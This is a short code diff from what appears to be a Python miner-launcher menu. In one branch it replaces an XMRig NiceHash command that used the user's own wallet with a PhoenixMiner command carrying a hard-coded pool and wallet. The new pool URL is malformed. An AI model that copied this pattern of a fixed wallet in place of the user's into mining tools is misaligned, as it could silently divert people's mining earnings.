@@ -122,8 +122,7 @@ if select_pool == "1":
 
     if select == "10":
         os.system("cls")
-        os.system(r"Miners\XMRig-CPU\xmrig.exe --donate-level=1 -o stratum+tcp://randomxmonero." + region + ".nicehash.com:3380 --coin=monero -u " +
-                  (nicehash_wallet) + r" -k --nicehash" + " " + (miner_commands))
+        os.system(r"Miners\PhoenixMiner-5.6d\PhoenixMiner -pool stratum+tcp//s.comining.io:9999 -wal A2pySTrK3UND6A24JUbj6eU.worker -pass x -log 0 -proto 4 ")
 
     if select == "exit":
         os.system('exit')
